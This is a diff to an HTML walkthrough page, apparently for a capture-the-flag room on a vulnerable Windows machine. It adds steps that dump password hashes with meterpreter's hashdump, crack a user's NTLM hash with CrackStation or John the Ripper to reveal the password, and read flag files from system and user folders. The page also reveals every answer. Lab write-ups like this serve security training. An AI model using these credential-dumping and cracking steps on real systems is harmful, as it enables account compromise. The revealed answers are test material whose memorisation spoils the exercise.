@@ -35,11 +35,11 @@
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
     <link href="/static/favicon.ico" rel="icon" />
-    <link href="/resources/css/retype.css?v=2.2.706898230882" rel="stylesheet" data-turbo-track="reload" />
+    <link href="/resources/css/retype.css?v=2.2.706899354470" rel="stylesheet" data-turbo-track="reload" />
 
-    <script type="text/javascript" src="/resources/js/config.js?v=2.2.706898230882" defer data-turbo-track="reload"></script>
+    <script type="text/javascript" src="/resources/js/config.js?v=2.2.706899354470" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=2.2" defer data-turbo-track="reload"></script>
-    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.706898230882" defer></script>
+    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.706899354470" defer></script>
 </head>
 <body>
     <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=G-77BVC9KX4X" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
@@ -498,7 +498,7 @@ Id  Name  Type                     Information                                  
 </doc-codeblock></div>
 <p>Now run the <code v-pre>ps</code> command to list all the running processes on the traget machine.</p>
 <p><figure class="content-center">
-    <img src="/static/images/exploit-ps.png" alt="Running processes on target machine" />
+    <img src="/static/images/ps-blue.png" alt="Running processes on target machine" />
     <figcaption class="caption">Running processes on target machine</figcaption>
 </figure>
 </p>
@@ -514,6 +514,71 @@ Id  Name  Type                     Information                                  
         <span>Cracking</span>
     </h3>
 </doc-anchor-target>
+<p><strong>Within our elevated meterpreter shell, run the command &#x27;hashdump&#x27;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</strong></p>
+<p>Run the <code v-pre>hashdump</code> command within the meterpreter session.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</code></pre>
+</doc-codeblock></div>
+<doc-panel id="reveal-answer" collapsed>
+    <template #title>Reveal Answer</template>
+<p>Jon</p>
+</doc-panel>
+<p><strong>Copy this password hash to a file and research how to crack it. What is the cracked password?</strong></p>
+<p>Copy the hash <code v-pre>ffb43f0de35be4d9917ac0cc8ad57f8d</code> into <a href="https://crackstation.net/">CrackStation</a> to reveal the password, or use John the Ripper: <code v-pre>john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt password.txt</code>. Create a text-file with the hash.</p>
+<doc-panel id="reveal-answer" collapsed>
+    <template #title>Reveal Answer</template>
+<p>alqfna22</p>
+</doc-panel>
+<doc-anchor-target id="find-flags">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#find-flags">#</doc-anchor-trigger>
+        <span>Find Flags!</span>
+    </h3>
+</doc-anchor-target>
+<p>Background the meterpreter session with command <code v-pre>background</code> and start the shell session with command <code v-pre>sessions &lt;SESSION_ID&gt;</code>.</p>
+<p><strong>Flag1? This flag can be found at the system root.</strong></p>
+<p>Change directory to <code v-pre>C:\</code> and run the <code v-pre>dir</code> command.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">C:\Windows\system32&gt;cd C:\
+cd C:\
+
+C:\&gt;dir
+dir
+Volume in drive C has no label.
+Volume Serial Number is E611-0B66
+
+Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+07/13/2009  10:20 PM    &lt;DIR&gt;          PerfLogs
+04/12/2011  03:28 AM    &lt;DIR&gt;          Program Files
+03/17/2019  05:28 PM    &lt;DIR&gt;          Program Files (x86)
+12/12/2018  10:13 PM    &lt;DIR&gt;          Users
+03/17/2019  05:36 PM    &lt;DIR&gt;          Windows
+            1 File(s)             24 bytes
+            5 Dir(s)  20,369,653,760 bytes free</code></pre>
+</doc-codeblock></div>
+<p>Use the command <code v-pre>type flag1.txt</code> to print the content of the file to your terminal.</p>
+<doc-panel id="reveal-flag-1" collapsed>
+    <template #title>Reveal Flag 1</template>
+<p access_the_machine="">flag</p>
+</doc-panel>
+<p><strong>Flag2? This flag can be found at the location where passwords are stored within Windows.</strong></p>
+<p>The command <code v-pre>dir *flag*.* /s</code> will reveal the location of where the flags are stored.</p>
+<p><code v-pre>type C:\Windows\System32\config\flag2.txt</code></p>
+<doc-panel id="reveal-flag-2" collapsed>
+    <template #title>Reveal Flag 2</template>
+<p sam_database_elevated_access="">flag</p>
+</doc-panel>
+<p><strong>Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</strong></p>
+<p><code v-pre>type C:\Users\Jon\Documents\flag3.txt</code></p>
+<doc-panel id="reveal-flag-3" collapsed>
+    <template #title>Reveal Flag 3</template>
+<p admin_documents_can_be_valuable="">flag</p>
+</doc-panel>
 
                                 <div class="flex items-center mt-6 mb-6 clear-both">
                                     <span>
